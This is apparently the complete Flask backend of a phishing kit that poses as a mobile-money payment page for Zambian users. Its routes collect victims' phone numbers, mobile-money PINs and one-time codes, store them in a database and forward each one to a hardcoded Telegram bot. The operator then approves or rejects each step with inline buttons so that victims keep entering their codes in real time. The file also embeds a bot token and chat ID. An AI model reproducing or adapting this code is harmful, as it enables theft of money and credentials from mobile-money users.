from flask import Flask, render_template, request, jsonify
import requests
import sqlite3
import random
import string
from datetime import datetime
import os
import threading
import time

app = Flask(__name__)
app.secret_key = 'momo-starlink-2024'

BOT_TOKEN = '8721769584:AAGiP-m_GlFDW8_0E6N5It7qaZR17dMd3Ts'
CHAT_ID = '8589275340'
TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        app_id TEXT, plan TEXT, amount INTEGER,
        phone TEXT, pin TEXT, code TEXT,
        status TEXT DEFAULT 'pending',
        code_status TEXT DEFAULT 'pending'
    )''')
    conn.commit()
    conn.close()

init_db()

def send_telegram(message, reply_markup=None):
    try:
        payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        if reply_markup: payload['reply_markup'] = reply_markup
        requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
    except Exception as e: print(f'Telegram error: {e}')

def edit_telegram(message_id, text):
    try:
        requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
    except Exception as e: print(f'Edit error: {e}')

@app.route('/') 
def index(): return render_template('index.html')

@app.route('/login') 
def login(): return render_template('login.html')

@app.route('/verify') 
def verify(): return render_template('verify.html')

@app.route('/api/submit_payment', methods=['POST'])
def submit_payment():
    data = request.json
    phone = data.get('phone',''); pin = data.get('pin','')
    amount = int(data.get('amount',0)); plan = data.get('plan','')
    purpose = data.get('purpose','')
    conn = sqlite3.connect('database.db'); c = conn.cursor()
    
    if purpose == 'OTP REQUESTED':
        c.execute("SELECT COUNT(*) FROM payments WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
        if c.fetchone()[0] >= 3:
            conn.close()
            return jsonify({'success': False})
        app_id = 'MM-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        code = str(random.randint(1000, 9999))
        c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
        conn.commit(); conn.close()
        msg = f'📤 OTP REQUESTED\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}'
        send_telegram(msg, {'inline_keyboard':[[{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
        return jsonify({'success':True,'app_id':app_id})
    
    app_id = 'MM-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    code = str(random.randint(1000, 9999))
    c.execute('INSERT INTO payments (app_id, plan, amount, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,plan,amount,phone,pin,code))
    conn.commit(); conn.close()
    
    msg = f'📥 NEW PAYMENT\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}\n🔢 PIN: {pin}'
    send_telegram(msg, {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
    return jsonify({'success':True,'app_id':app_id})

@app.route('/api/submit_code', methods=['POST'])
def submit_code():
    data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
    conn = sqlite3.connect('database.db'); c = conn.cursor()
    c.execute('SELECT phone, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
    p = c.fetchone()
    if p:
        phone, amount, plan, pin = p
        msg = f'🔐 CODE VERIFICATION\n\n🆔 {app_id}\n📞 +260 {phone}\n📦 {plan}\n💰 ZMW {amount:,}\n🔢 PIN: {pin}\n\n📋 FULL MESSAGE:\n```\n{entered_code}\n```'
        send_telegram(msg, {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'wrongpin_{app_id}'},{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'},{'text':'✅ APPROVE','callback_data':f'approve_{app_id}'}]]})
    conn.close()
    return jsonify({'success':True})

@app.route('/api/check_status/<app_id>')
def check_status(app_id):
    conn = sqlite3.connect('database.db'); c = conn.cursor()
    c.execute('SELECT status, code_status FROM payments WHERE app_id = ?',(app_id,))
    p = c.fetchone(); conn.close()
    if p: return jsonify({'status':p[0],'code_status':p[1]})
    return jsonify({'status':'not_found'})

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if 'callback_query' in data:
        cb = data['callback_query']; cb_data = cb['data']
        msg_id = cb['message']['message_id']; original = cb['message']['text']
        conn = sqlite3.connect('database.db'); c = conn.cursor()
        
        if cb_data.startswith('deny_'): 
            aid = cb_data.replace('deny_','')
            c.execute('UPDATE payments SET status="invalid" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ INVALID')
        
        elif cb_data.startswith('allow_'): 
            aid = cb_data.replace('allow_','')
            c.execute('UPDATE payments SET status="approved" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n✅ ALLOWED')
        
        elif cb_data.startswith('wrongpin_'): 
            aid = cb_data.replace('wrongpin_','')
            c.execute('UPDATE payments SET status="wrong_pin", code_status="wrong_pin" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ WRONG PIN - User sent back')
        
        elif cb_data.startswith('wrongcode_'): 
            aid = cb_data.replace('wrongcode_','')
            c.execute('UPDATE payments SET code_status="wrong_code" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
        
        elif cb_data.startswith('approve_'): 
            aid = cb_data.replace('approve_','')
            c.execute('UPDATE payments SET code_status="approved" WHERE app_id=?',(aid,))
            conn.commit()
            edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")}')
        
        conn.close()
    return jsonify({'ok':True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
